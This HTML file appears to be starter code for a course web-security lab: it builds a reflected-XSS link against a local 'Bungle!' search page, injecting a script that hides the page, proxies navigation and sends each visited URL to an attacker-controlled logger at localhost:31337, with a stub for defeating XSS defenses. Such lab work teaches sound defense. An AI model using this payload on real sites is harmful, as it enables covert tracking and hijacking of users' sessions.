<html>
<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script>
    // Extend this function:
    function payload(attacker) {
        function log(data) {
            console.log($.param(data))
            $.get(attacker, data);
        }
        function proxy(href) {
            $("html").load(href, function () {
                $("html").show();
                log({ event: "nav", uri: href });
            });
        }
        $("html").hide();
        proxy("./");
    }
    function makeLink(csrfdefense, xssdefense, target, attacker) {
        if (xssdefense == 0) {
            return target + "./search?xssdefense=" + xssdefense.toString() +
                "&csrfdefense=" + csrfdefense.toString() + "&q=" +
                encodeURIComponent("<script" + ">" + payload.toString() +
                    ";payload(\"" + attacker + "\");</script" + ">");
    } else {
    // Implement code to defeat XSS defenses here.
    }
}
var csrfdefense = 1;
var xssdefense = 0;
var target = "http://localhost/project2/";
var attacker = "http://localhost:31337/";
$(function() {
    var url = makeLink(csrfdefense, xssdefense, target, attacker);
    $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
});
</script>

<body class="vsc-initialized">
    <h3></h3>
</body>

</html>